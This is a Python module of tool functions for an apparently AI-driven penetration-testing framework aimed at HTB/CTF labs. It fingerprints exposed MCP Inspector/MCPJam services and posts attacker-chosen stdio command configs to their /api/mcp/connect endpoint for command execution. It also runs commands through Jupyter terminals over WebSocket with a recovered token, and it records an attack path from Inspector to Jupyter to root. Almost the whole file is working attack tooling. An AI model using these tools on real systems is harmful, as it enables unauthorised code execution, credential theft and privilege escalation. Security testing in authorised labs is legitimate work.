"""
Development tooling pivot helpers.

These tools cover exposed control-plane services that often appear in HTB/CTF
labs and internal assessments: MCP Inspector/MCPJam and Jupyter Notebook.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import shlex
import socket
import ssl
import struct
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

from src.sdk.tool import function_tool


def _normalize_base_url(base_url: str) -> str:
    base_url = (base_url or "").strip()
    if not base_url:
        raise ValueError("base_url is required")
    if "://" not in base_url:
        base_url = "http://" + base_url
    return base_url.rstrip("/")


def _http_request(
    url: str,
    method: str = "GET",
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: int = 10,
) -> tuple[int, dict[str, str], str]:
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            data = resp.read()
            return resp.status, dict(resp.headers.items()), data.decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        data = e.read()
        return e.code, dict(e.headers.items()), data.decode("utf-8", errors="replace")


def _active_target(explicit_target: str = "") -> str:
    if explicit_target:
        return explicit_target
    try:
        from src.sdk.context_hub import get_context_hub

        return get_context_hub().current_target or ""
    except Exception:
        return ""


def _persist_devtool_findings(target: str, base_url: str, endpoints: list[str], hints: list[str]) -> None:
    if not target:
        return
    try:
        from src.repl.profiles import get_profile_manager

        pm = get_profile_manager()
        for endpoint in endpoints:
            pm.add_api_endpoint(
                target,
                endpoint,
                source="mcp_inspector_audit",
                notes="Extracted from exposed MCP Inspector frontend/API.",
            )
        pm.add_devtool(
            target,
            name="MCP Inspector / MCPJam",
            url=base_url,
            risk="high",
            evidence="Exposed MCP Inspector service with client-side MCP API routes.",
            next_step="Run mcp_inspector_connect_stdio or inspect /api/mcp/connect request schema.",
        )
        if any("8888" in hint or "jupyter" in hint.lower() for hint in hints):
            pm.add_devtool(
                target,
                name="Jupyter localhost service hint",
                url="http://127.0.0.1:8888",
                risk="high",
                evidence="Landing page or frontend references localhost Jupyter/8888.",
                next_step="If a Jupyter token is recovered, run jupyter_terminal_command through a tunnel or foothold.",
            )
            pm.add_attack_path(
                target,
                name="MCP Inspector to Jupyter to local root service",
                confidence="high",
                status="candidate",
                steps=[
                    "Confirm MCP Inspector on 6274",
                    "Use /api/mcp/connect with a controlled stdio/server config",
                    "Reach localhost Jupyter on 127.0.0.1:8888",
                    "Create a Jupyter terminal using the recovered token",
                    "Inspect user files and local root-only services",
                    "Use local privileged API/credential material for root",
                ],
            )
    except Exception:
        pass


@function_tool()
def mcp_inspector_audit(base_url: str, target: str = "") -> str:
    """
    Identify exposed MCP Inspector/MCPJam services and extract high-value API routes.

    Args:
        base_url: MCP Inspector base URL, for example http://devhub.htb:6274
        target: Optional profile target to persist findings under. Defaults to active target.

    Returns:
        A concise audit report with endpoints, localhost hints, and next tools.
    """
    base = _normalize_base_url(base_url)
    report: list[str] = [f"## MCP Inspector Audit: {base}", ""]

    html_status, html_headers, html = _http_request(base + "/", timeout=10)
    title_match = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
    title = re.sub(r"\s+", " ", title_match.group(1)).strip() if title_match else ""
    report.append(f"Root status: HTTP {html_status}")
    if title:
        report.append(f"Title: {title}")

    script_paths = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', html, re.I)
    css_paths = re.findall(r'<link[^>]+href=["\']([^"\']+\.css)["\']', html, re.I)

    api_status, api_headers, api_body = _http_request(base + "/api/mcp/servers", timeout=10)
    report.append(f"/api/mcp/servers: HTTP {api_status}")
    if api_body:
        report.append(f"Response preview: {api_body[:300]}")

    endpoints: set[str] = set()
    local_hints: set[str] = set()

    for path in script_paths[:5]:
        js_url = urllib.parse.urljoin(base + "/", path)
        status, _, js = _http_request(js_url, timeout=20)
        report.append(f"Fetched JS: {path} (HTTP {status}, {len(js)} chars)")
        if status >= 400 or not js:
            continue

        for endpoint in re.findall(r'["\'](/api/mcp/[^"\']+)["\']', js):
            endpoints.add(endpoint)
        for endpoint in re.findall(r'["\'](/api/[^"\']+)["\']', js):
            if "mcp" in endpoint.lower():
                endpoints.add(endpoint)
        for hint in re.findall(r"(?:localhost|127\.0\.0\.1):\d+", js, re.I):
            local_hints.add(hint)
        if "jupyter" in js.lower():
            local_hints.add("Jupyter reference in frontend bundle")

    if "MCPJam" in html or "MCP Inspector" in html or "/api/mcp/" in api_body or endpoints:
        report.append("")
        report.append("Assessment: Exposed MCP Inspector-style control plane detected.")
    else:
        report.append("")
        report.append("Assessment: MCP Inspector not confirmed from sampled responses.")

    if endpoints:
        report.append("")
        report.append("MCP/API endpoints:")
        for endpoint in sorted(endpoints)[:50]:
            report.append(f"- {endpoint}")

    if local_hints:
        report.append("")
        report.append("Local service hints:")
        for hint in sorted(local_hints):
            report.append(f"- {hint}")

    report.append("")
    report.append("Recommended next tool order:")
    report.append("1. mcp_inspector_connect_stdio(base_url, server_command, server_args)")
    report.append("2. If a Jupyter token is recovered, jupyter_terminal_command(base_url, token, command)")
    report.append("3. Persist recovered credentials with save_target_credential")

    active = _active_target(target)
    _persist_devtool_findings(active, base, sorted(endpoints), sorted(local_hints))

    return "\n".join(report)


@function_tool()
def mcp_inspector_connect_stdio(
    base_url: str,
    server_command: str,
    server_args: str = "",
    env_json: str = "",
    server_id: str = "cyber-copilot-stdio",
) -> str:
    """
    Attempt to connect an MCP Inspector instance to a stdio MCP server config.

    Args:
        base_url: MCP Inspector base URL, for example http://devhub.htb:6274
        server_command: Command configured as the MCP stdio server executable.
        server_args: Shell-like argument string for the command.
        env_json: Optional JSON object of environment variables.
        server_id: Client-side server id to assign.

    Returns:
        HTTP responses for several common MCP Inspector connect schemas.
    """
    base = _normalize_base_url(base_url)
    args = shlex.split(server_args) if server_args else []
    try:
        env = json.loads(env_json) if env_json.strip() else {}
        if not isinstance(env, dict):
            return "Error: env_json must decode to a JSON object."
    except Exception as e:
        return f"Error parsing env_json: {e}"

    common_config = {
        "command": server_command,
        "args": args,
        "env": env,
    }
    configs: list[dict[str, Any]] = [
        {"serverId": server_id, "serverConfig": {"type": "stdio", **common_config}},
        {"serverId": server_id, "serverConfig": {"transportType": "stdio", **common_config}},
        {"serverId": server_id, "config": {"type": "stdio", **common_config}},
        {"id": server_id, "transport": "stdio", **common_config},
    ]

    lines = [f"## MCP Inspector stdio connect attempts: {base}", ""]
    for i, payload in enumerate(configs, 1):
        body = json.dumps(payload).encode("utf-8")
        status, headers, text = _http_request(
            base + "/api/mcp/connect",
            method="POST",
            body=body,
            headers={"Content-Type": "application/json"},
            timeout=15,
        )
        lines.append(f"### Attempt {i}: HTTP {status}")
        lines.append(json.dumps(payload, indent=2)[:1200])
        lines.append("Response:")
        lines.append(text[:2000] if text else "(empty)")
        lines.append("")
        if 200 <= status < 300 and "error" not in text[:300].lower():
            lines.append("Likely connected. Next: query list/call tools through the Inspector UI/API.")
            break

    try:
        target = _active_target()
        if target:
            from src.repl.profiles import get_profile_manager

            get_profile_manager().add_attack_path(
                target,
                "MCP Inspector stdio config tested",
                [f"POST {base}/api/mcp/connect", f"stdio command: {server_command}"],
                confidence="medium",
                status="tested",
            )
    except Exception:
        pass

    return "\n".join(lines)


def _send_ws_text(sock: socket.socket, text: str) -> None:
    data = json.dumps(["stdin", text]).encode("utf-8")
    mask = os.urandom(4)
    header = bytearray([0x81])
    n = len(data)
    if n < 126:
        header.append(0x80 | n)
    elif n < 65536:
        header.append(0x80 | 126)
        header.extend(struct.pack("!H", n))
    else:
        header.append(0x80 | 127)
        header.extend(struct.pack("!Q", n))
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    sock.sendall(bytes(header) + mask + masked)


def _recv_ws_frame(sock: socket.socket) -> tuple[int, bytes] | None:
    header = sock.recv(2)
    if not header:
        return None
    b1, b2 = header
    length = b2 & 0x7F
    if length == 126:
        length = struct.unpack("!H", sock.recv(2))[0]
    elif length == 127:
        length = struct.unpack("!Q", sock.recv(8))[0]
    if b2 & 0x80:
        mask = sock.recv(4)
    else:
        mask = b""
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    if mask:
        data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    return b1 & 0x0F, data


@function_tool()
def jupyter_terminal_command(
    base_url: str,
    token: str,
    command: str,
    terminal_name: str = "",
    read_seconds: int = 6,
) -> str:
    """
    Create/use a Jupyter terminal over WebSocket and run one command.

    Args:
        base_url: Jupyter base URL reachable from the framework, e.g. http://127.0.0.1:8888
        token: Jupyter token.
        command: Command to send to the terminal.
        terminal_name: Existing terminal name. If empty, a new terminal is created.
        read_seconds: Seconds to collect output after sending the command.

    Returns:
        Terminal output captured from the Jupyter WebSocket.
    """
    base = _normalize_base_url(base_url)
    parsed = urllib.parse.urlparse(base)
    if parsed.scheme not in ("http", "https"):
        return "Error: only http/https Jupyter URLs are supported."

    query = urllib.parse.urlencode({"token": token})
    if not terminal_name:
        status, _, text = _http_request(
            f"{base}/api/terminals?{query}",
            method="POST",
            body=b"",
            timeout=10,
        )
        if status >= 400:
            return f"Failed to create terminal: HTTP {status}\n{text[:1000]}"
        try:
            terminal_name = str(json.loads(text).get("name") or "")
        except Exception:
            terminal_name = ""
        if not terminal_name:
            return f"Failed to parse terminal name from response: {text[:1000]}"

    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    ws_path = f"/terminals/websocket/{urllib.parse.quote(terminal_name)}?{query}"
    key = base64.b64encode(os.urandom(16)).decode("ascii")

    raw_sock = socket.create_connection((host, port), timeout=10)
    sock: socket.socket
    if parsed.scheme == "https":
        sock = ssl.create_default_context().wrap_socket(raw_sock, server_hostname=host)
    else:
        sock = raw_sock

    request = (
        f"GET {ws_path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        f"Origin: {parsed.scheme}://{host}:{port}\r\n"
        "\r\n"
    )
    sock.sendall(request.encode("ascii"))
    response = sock.recv(4096).decode("utf-8", errors="replace")
    status_line = response.splitlines()[0] if response else ""
    if "101" not in status_line:
        sock.close()
        return f"WebSocket upgrade failed: {status_line}\n{response[:1000]}"

    if not command.endswith("\n"):
        command += "\n"
    _send_ws_text(sock, command)

    output: list[str] = [f"Terminal: {terminal_name}", f"Handshake: {status_line}", ""]
    sock.settimeout(1.0)
    end = time.time() + max(1, min(read_seconds, 30))
    while time.time() < end:
        try:
            frame = _recv_ws_frame(sock)
        except socket.timeout:
            continue
        if not frame:
            break
        opcode, data = frame
        if opcode == 1:
            try:
                message = json.loads(data.decode("utf-8", errors="replace"))
                output.append("".join(str(part) for part in message[1:]))
            except Exception:
                output.append(data.decode("utf-8", errors="replace"))
        elif opcode == 8:
            break
    sock.close()
    return "".join(output)

